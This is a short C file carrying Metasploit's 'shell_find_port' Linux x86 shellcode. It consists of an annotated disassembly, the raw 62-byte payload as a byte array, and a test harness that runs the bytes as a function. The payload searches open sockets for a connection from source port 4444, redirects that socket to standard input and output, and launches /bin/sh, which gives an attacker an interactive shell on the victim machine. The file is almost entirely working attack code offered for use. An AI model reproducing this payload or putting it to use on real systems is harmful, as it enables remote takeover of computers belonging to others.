/* Title: Linux Command Shell, Find Port Inline  ( 62 bytes)
 * Author: metasploit 
 * Description: Metasploit's payload/linux/x86/shell_find_port

   ; getpeername(sockfd, *sockaddr, *0x10)
   00000000  31DB              xor ebx,ebx
   00000002  53                push ebx
   00000003  89E7              mov edi,esp
   00000005  6A10              push byte +0x10
   00000007  54                push esp
   00000008  57                push edi
   00000009  53                push ebx
   0000000A  89E1              mov ecx,esp
   0000000C  B307              mov bl,0x7
   ; while (sockaddr_in.sin_port != 4444)
   0000000E  FF01              inc dword [ecx]
   00000010  6A66              push byte +0x66
   00000012  58                pop eax
   00000013  CD80              int 0x80
   00000015  66817F02115C      cmp word [edi+0x2],0x5c11
   0000001B  75F1              jnz 0xe
   ; for( ecx=2; ecx > 0; ecx--) { dup2(sockfd, ecx) }
   0000001D  5B                pop ebx
   0000001E  6A02              push byte +0x2
   00000020  59                pop ecx
   00000021  B03F              mov al,0x3f
   00000023  CD80              int 0x80
   00000025  49                dec ecx
   00000026  79F9              jns 0x21
   ; execve("/bin//sh")
   00000028  50                push eax
   00000029  682F2F7368        push dword 0x68732f2f
   0000002E  682F62696E        push dword 0x6e69622f
   00000033  89E3              mov ebx,esp
   00000035  50                push eax
   00000036  53                push ebx
   00000037  89E1              mov ecx,esp
   00000039  99                cdq
   0000003A  B00B              mov al,0xb
   0000003C  CD80              int 0x80

 */




#include<stdio.h>
#include<string.h>
 
 
unsigned char buf[] =
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x11\x5c\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80";

main()
{

    printf("Shellcode Length:  %d\n", strlen(buf));
 
    int (*ret)() = (int(*)())buf;
 
    ret();
 
}
